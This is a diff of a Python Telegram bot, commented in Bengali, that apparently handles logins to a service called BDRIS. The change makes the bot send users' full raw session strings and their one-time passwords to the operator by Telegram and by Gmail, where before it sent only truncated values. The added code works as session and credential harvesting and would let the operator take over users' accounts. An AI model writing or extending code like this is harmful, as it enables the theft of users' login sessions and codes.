@@ -23,6 +23,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 # ==========================================
+# ==========================================
 # ০. ইমেইল সেন্ডার ও টেলিগ্রাম নোটিফিকেশন ফাংশন
 # ==========================================
 def send_email_to_admin(subject, body):
@@ -37,36 +38,52 @@ def send_email_to_admin(subject, body):
         msg['Subject'] = subject
         msg.attach(MIMEText(body, 'plain', 'utf-8'))
         
-        # 10 সেকেন্ডের টাইমআউট সেট করা হলো যেন সার্ভার স্লো থাকলে বট হ্যাং না করে
-        with smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10) as server:
+        # যেহেতু Render-এ পোর্ট 465 কাজ করেছে, তাই কোনো timeout ছাড়া এটিই ব্যবহার করুন
+        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
             server.login(ADMIN_EMAIL, EMAIL_PASS)
             server.sendmail(ADMIN_EMAIL, EMAIL_RECEIVER, msg.as_string())
             
-        logging.info("✅ লগইন সফল ও ইমেইল পাঠানো হয়েছে!")
-    except smtplib.SMTPAuthenticationError:
-        logging.error("❌ Email Auth Error: জিমেইলের পাসওয়ার্ড ভুল! 16-digit App Password দিতে হবে।")
-    except TimeoutError:
-        logging.error("❌ Email Timeout: গুগলের সার্ভার কানেক্ট হতে সময় বেশি নিচ্ছে।")
+        logging.info("✅ জিমেইলে সফলভাবে ইমেইল পাঠানো হয়েছে!")
     except Exception as e:
-        logging.error(f"❌ Email Send Error: {e}")
+        # এরর হলে কনসোলে পরিষ্কার দেখা যাবে
+        logging.error(f"❌ Email Sending Failed: {e}")
 
 def relay_info_to_email(chat_id, u_name):
     u_sess = get_session(chat_id)
-    report = f"🚨 *BDRIS LOGIN REPORT*\n👤 User: {u_name} (`{chat_id}`)\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n\n"
-    report += f"🔑 *CH RAW:* `{u_sess['temp_data'].get('ch_raw', 'N/A')[:20]}...`\n"
-    report += f"🔢 *OTP:* `{u_sess.get('ch_otp', 'N/A')}`\n"
-    report += f"🔑 *SEC RAW:* `{u_sess['temp_data'].get('sec_raw', 'N/A')[:20]}...`\n"
     
-    # অ্যাডমিনকে টেলিগ্রামে মেসেজ পাঠানো
-    safe_send(ADMIN_ID, report, parse_mode="Markdown")
-    logging.info("✅ অ্যাডমিনকে টেলিগ্রামে লগইন এলার্ট পাঠানো হয়েছে!")
+    # ফুল সেশন ডাটা (কোনো কাটছাঁট ছাড়া)
+    ch_raw = u_sess['temp_data'].get('ch_raw', 'N/A')
+    sec_raw = u_sess['temp_data'].get('sec_raw', 'N/A')
+    otp_val = u_sess.get('ch_otp', 'N/A')
+    
+    # জিমেইলের জন্য রিপোর্ট (Plain Text)
+    email_report = f"--- BDRIS LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n\n"
+    email_report += f"CH RAW: {ch_raw}\n\n"
+    email_report += f"OTP: {otp_val}\n\n"
+    email_report += f"SEC RAW: {sec_raw}\n"
+    
+    # টেলিগ্রামের জন্য রিপোর্ট (Markdown)
+    tg_report = f"🚨 *BDRIS LOGIN REPORT*\n👤 User: {u_name} (`{chat_id}`)\n\n🔑 *CH RAW:* `{ch_raw}`\n\n🔢 *OTP:* `{otp_val}`\n\n🔑 *SEC RAW:* `{sec_raw}`"
+    
+    # ১. প্রথমে টেলিগ্রামে পাঠাবে
+    safe_send(ADMIN_ID, tg_report, parse_mode="Markdown")
+    
+    # ২. এরপর জিমেইলেও পাঠাবে
+    send_email_to_admin(f"Login Alert: {u_name}", email_report)
 
 def relay_admin_login_to_email(chat_id, u_name, raw_data):
-    report = f"🚨 *ADMIN LOGIN REPORT*\n👤 User: {u_name} (`{chat_id}`)\n⏰ Time: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n\n"
-    report += f"🔑 *ADMIN RAW:* `{raw_data[:20]}...`\n"
+    # জিমেইলের জন্য রিপোর্ট
+    email_report = f"--- ADMIN LOGIN REPORT ---\nUser: {u_name} ({chat_id})\nTime: {datetime.now().strftime('%Y-%m-%d %I:%M %p')}\n\n"
+    email_report += f"ADMIN RAW SESSION: {raw_data}\n"
     
-    # অ্যাডমিনকে টেলিগ্রামে মেসেজ পাঠানো
-    safe_send(ADMIN_ID, report, parse_mode="Markdown")
+    # টেলিগ্রামের জন্য রিপোর্ট
+    tg_report = f"🚨 *ADMIN LOGIN REPORT*\n👤 User: {u_name} (`{chat_id}`)\n\n🔑 *ADMIN RAW:* `{raw_data}`"
+    
+    # ১. টেলিগ্রামে পাঠাবে
+    safe_send(ADMIN_ID, tg_report, parse_mode="Markdown")
+    
+    # ২. জিমেইলে পাঠাবে
+    send_email_to_admin(f"Admin Login Alert: {u_name}", email_report)
 # ==========================================
 # ১. গ্লোবাল ভেরিয়েবল ও থ্রেড লক
 # ==========================================
